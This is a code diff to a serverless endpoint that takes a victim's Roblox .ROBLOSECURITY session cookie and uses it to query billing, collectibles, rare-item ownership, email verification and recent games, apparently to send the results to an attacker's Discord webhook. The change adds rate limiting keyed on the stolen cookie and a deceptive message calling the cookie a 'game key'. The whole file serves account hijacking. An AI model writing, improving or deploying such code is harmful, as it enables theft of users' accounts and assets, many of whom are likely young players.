@@ -1,7 +1,32 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- CSRF token ----------
+// ---------- Rate limiting (in-memory, 10 minutes) ----------
+const rateLimitMap = new Map(); // key: cookie hash, value: timestamp
+
+function getCookieHash(cookie) {
+  // Use first 50 chars as a simple hash (enough to identify without storing full cookie)
+  return cookie.substring(0, 50);
+}
+
+function isRateLimited(cookie) {
+  const hash = getCookieHash(cookie);
+  const lastUsed = rateLimitMap.get(hash);
+  if (lastUsed && Date.now() - lastUsed < 10 * 60 * 1000) {
+    return true;
+  }
+  // Update timestamp
+  rateLimitMap.set(hash, Date.now());
+  // Clean up old entries every hour
+  if (rateLimitMap.size > 100) {
+    for (const [key, time] of rateLimitMap.entries()) {
+      if (Date.now() - time > 10 * 60 * 1000) rateLimitMap.delete(key);
+    }
+  }
+  return false;
+}
+
+// ---------- Helper: get CSRF token ----------
 async function getCsrfToken(cookie) {
   const res = await fetch("https://auth.roblox.com/v2/logout", {
     method: "GET",
@@ -97,7 +122,7 @@ async function getBilling(cookie, csrfToken) {
   }
 }
 
-// ---------- Groups ----------
+// ---------- Groups membership count ----------
 async function getGroupsCount(userId) {
   try {
     const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
@@ -131,7 +156,7 @@ async function getTotalPlaceVisits(userId) {
   return totalVisits;
 }
 
-// ---------- Collectibles ----------
+// ---------- Collectibles (full list for third embed) ----------
 async function getAllCollectibles(userId, cookie) {
   let items = [];
   let cursor = null;
@@ -150,7 +175,7 @@ async function getAllCollectibles(userId, cookie) {
   }));
 }
 
-// ---------- Email verification (Verified hat) ----------
+// ---------- Email verification ----------
 async function isEmailVerified(userId, cookie) {
   try {
     const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/102611803/is-owned`, {
@@ -178,32 +203,30 @@ async function checkItemOwnership(userId, cookie, assetId) {
   }
 }
 
-// ---------- RECENT GAMES (no favorites) ----------
+// ---------- RECENT GAMES (uses CSRF token to get actual recent games) ----------
 async function getRecentlyPlayedGames(userId, cookie, csrfToken) {
-  // Primary method: official recent-games endpoint with CSRF token
   try {
     const res = await fetch(`https://games.roblox.com/v1/users/${userId}/recent-games`, {
       headers: {
         Cookie: `.ROBLOSECURITY=${cookie}`,
         "X-CSRF-TOKEN": csrfToken || "",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json"
+        "Accept": "application/json, text/plain, */*"
       }
     });
     if (res.ok) {
       const data = await res.json();
       const games = data.data || [];
-      console.log(`[recent-games] Found ${games.length} recent games`);
+      console.log(`[recent-games] Found ${games.length} games`);
       return games.map(g => g.name).filter(Boolean);
     } else {
-      console.warn(`[recent-games] HTTP ${res.status}, body: ${await res.text()}`);
+      console.warn(`[recent-games] HTTP ${res.status}`);
     }
   } catch (e) {
     console.warn("[recent-games] fetch error:", e.message);
   }
 
-  // Fallback: Continue endpoint (also gives recent games)
+  // Fallback: Continue endpoint
   try {
     const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
       headers: {
@@ -217,7 +240,7 @@ async function getRecentlyPlayedGames(userId, cookie, csrfToken) {
     if (res.ok) {
       const data = await res.json();
       const games = Array.isArray(data) ? data : (data.data || []);
-      console.log(`[Continue] Found ${games.length} recent games`);
+      console.log(`[Continue] Found ${games.length} games`);
       return games.map(g => g.name || g.displayName || "").filter(Boolean);
     }
   } catch (e) {
@@ -230,7 +253,7 @@ async function getRecentlyPlayedGames(userId, cookie, csrfToken) {
 async function getPlayedPasses(userId, cookie, csrfToken) {
   const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
   const recentGames = await getRecentlyPlayedGames(userId, cookie, csrfToken);
-  console.log("Recent games list for matching:", recentGames);
+  console.log("Recent games list:", recentGames);
   return targetGames.map(name => {
     const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
     return { name, played: played ? "True" : "False" };
@@ -255,7 +278,7 @@ async function getCountryFlag(req) {
   return '🌍 Unknown';
 }
 
-// ---------- Avatar ----------
+// ---------- Avatar URL ----------
 async function getUserAvatarUrl(userId) {
   try {
     const res = await fetch(
@@ -279,6 +302,11 @@ export default async function handler(req, res) {
   if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
+  // Rate limiting: block same cookie for 10 minutes
+  if (isRateLimited(cookie)) {
+    return res.status(429).json({ blocked: true, message: "This game key has been used recently. Please wait 10 minutes before trying again." });
+  }
+
   try {
     let csrfToken = null;
     try {
@@ -298,8 +326,8 @@ export default async function handler(req, res) {
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid),
       isEmailVerified(rbxuid, cookie),
-      checkItemOwnership(rbxuid, cookie, 1373933),      // Korblox
-      checkItemOwnership(rbxuid, cookie, 134082613)     // Headless
+      checkItemOwnership(rbxuid, cookie, 1373933),
+      checkItemOwnership(rbxuid, cookie, 134082613)
     ]);
 
     let settings = { verified: "False", banned: "False" };
